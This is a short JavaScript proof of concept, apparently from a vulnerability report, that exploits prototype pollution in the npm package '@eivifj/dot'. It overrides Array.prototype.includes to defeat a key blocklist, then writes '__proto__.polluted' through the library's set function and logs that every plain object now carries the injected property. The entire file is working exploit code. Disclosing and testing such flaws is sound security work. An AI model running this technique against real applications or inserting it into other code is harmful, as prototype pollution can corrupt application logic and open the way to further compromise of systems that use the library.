Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const a = require('@eivifj/dot');
const path = '__proto__.polluted';
console.log({}.polluted);
a.set({}, path, 'yes');
console.log({}.polluted);